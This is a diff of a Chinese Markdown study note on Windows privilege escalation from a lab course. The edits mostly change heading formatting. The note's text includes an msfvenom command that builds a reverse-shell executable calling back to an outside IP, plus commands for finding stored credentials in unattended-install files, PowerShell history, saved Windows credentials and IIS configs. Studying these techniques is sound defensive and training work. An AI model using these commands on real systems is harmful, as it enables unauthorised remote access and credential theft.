@@ -2,6 +2,7 @@
 - [windows提权](#windows提权)
 - [理论](#理论)
   - [THM基础](#thm基础)
+    - [反shell](#反shell)
     - [滥用服务错误配置](#滥用服务错误配置)
     - [滥用危险的特权](#滥用危险的特权)
     - [滥用易受攻击的软件](#滥用易受攻击的软件)
@@ -18,7 +19,7 @@
 
 ## THM基础
 
->反shell
+### 反shell
 
 生成反shell:  
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -o reverse.exe
@@ -27,7 +28,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -
 copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
->无人值守的 Windows 安装
+**无人值守的 Windows 安装**
 
 可能存在的位置： 
 ``````
@@ -45,19 +46,19 @@ C:\Windows\system32\sysprep\sysprep.xml
     <Password>MyPassword123</Password>
 </Credentials>
 ``````
->Powershell 历史
+**Powershell 历史**
 
 cmd:  
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
 powershell:  
 type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt   
 
->保存的 Windows 凭据
+**保存的 Windows 凭据**
 
 cmdkey /list
 
 runas /savecred /user:admin cmd.exe
->IIS 配置
+**IIS 配置**
 
 我们可以在以下位置之一找到 web.config：  
 C:\inetpub\wwwroot\web.config
